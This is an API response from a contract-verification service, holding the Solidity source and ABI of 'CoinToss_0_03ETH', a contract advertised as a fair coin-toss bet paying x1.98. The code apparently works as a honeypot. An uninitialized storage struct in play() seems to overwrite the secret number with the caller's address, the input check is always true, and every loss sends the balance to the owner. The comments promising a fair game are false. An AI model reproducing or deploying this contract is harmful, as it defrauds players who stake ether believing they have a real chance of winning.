{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\n// CoinToss_0_03ETH\r\n// Bet price: 0.03 ETH\r\n//\r\n// Guess the number secretly stored in the blockchain and get x1.98 payout (fee is only 1%)!\r\n// After one try, contract will be destroyed and in case of win you will\r\n// receive x1.98 of the bet and in case of lose, money goes to the admin.\r\n//\r\n// Admin will create new contract ASAP\r\n//\r\n// To play, call the play() method with the guessed number (1 or 2).\r\n// Bet price: 0.03 ether\r\n//\r\n// Contract balance at game start: 0.0294\r\n// If you guess the number correctly, you will receive 0.03 (your bet) + 0.0294 (contract balance) = 0.0594 (win with 1% fee (0.06 - 1%))\r\n//\r\n// GOOD LUCK!\r\n\r\ncontract CoinToss_0_03ETH {\r\n  uint256 private secretNumber;\r\n  uint256 public betPrice = 0.03 ether;\r\n  address public ownerAddr;\r\n\r\n  struct Game {\r\n    address player;\r\n    uint256 number;\r\n    bool win;\r\n  }\r\n\r\n  event GamePlayed(address player, uint256 number, bool win);\r\n\r\n  constructor() public {\r\n    ownerAddr = msg.sender;\r\n    tossACoin();\r\n  }\r\n\r\n  function tossACoin() internal {\r\n    // randomly set secretNumber with a value between 1 and 2\r\n    secretNumber = uint8(keccak256(block.timestamp, blockhash(block.number - 1))) % 2 + 1;\r\n  }\r\n\r\n  function play(uint256 number) public payable {\r\n    require(msg.value == betPrice, 'Please, bet exactly 0.03 ETH');\r\n    require(number > 1 || number < 2, 'Number must be 1 or 2');\r\n\r\n    Game game;\r\n    game.player = msg.sender;\r\n    game.number = number;\r\n\r\n    determineWinnerAndSendPayout(game);\r\n  }\r\n\r\n  function determineWinnerAndSendPayout(Game game) internal {\r\n    if (game.number == secretNumber) {\r\n      // win!\r\n      game.win = true;\r\n    } else {\r\n      // lose!\r\n      game.win = false;\r\n    }\r\n\r\n    emit GamePlayed(game.player, game.number, game.win);\r\n\r\n    if (game.win) {\r\n      selfdestruct(msg.sender);\r\n    } else {\r\n      selfdestruct(ownerAddr);\r\n    }\r\n  }\r\n\r\n  function kill() public {\r\n    // function to call in case nobody wants to play game :(\r\n    if (msg.sender == ownerAddr) {\r\n      selfdestruct(msg.sender);\r\n    }\r\n  }\r\n\r\n  function() public payable { }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"number\",\"type\":\"uint256\"}],\"name\":\"play\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"ownerAddr\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"betPrice\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"player\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"number\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"win\",\"type\":\"bool\"}],\"name\":\"GamePlayed\",\"type\":\"event\"}]","ContractName":"CoinToss_0_03ETH","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://02d0e4cc29d5b4df24889fb6083b5cba69e419905b8689d7ae443121650d3550"}]}